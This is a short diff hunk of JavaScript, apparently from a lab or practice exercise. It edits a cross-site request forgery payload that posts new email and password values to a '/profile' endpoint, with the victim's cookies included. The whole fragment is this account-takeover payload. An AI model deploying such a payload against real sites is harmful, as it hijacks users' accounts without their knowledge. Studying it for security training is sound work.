@@ -5,7 +5,7 @@ fetch("/profile", {
     headers: {
         "Content-Type": "application/x-www-form-urlencoded"
     },
-    body: "email=hacked@evil.com&password=hacked123",
+    body: "email=hacked@devbank.com&password=H4ck3d123@",
     credentials: "include"
 });
 
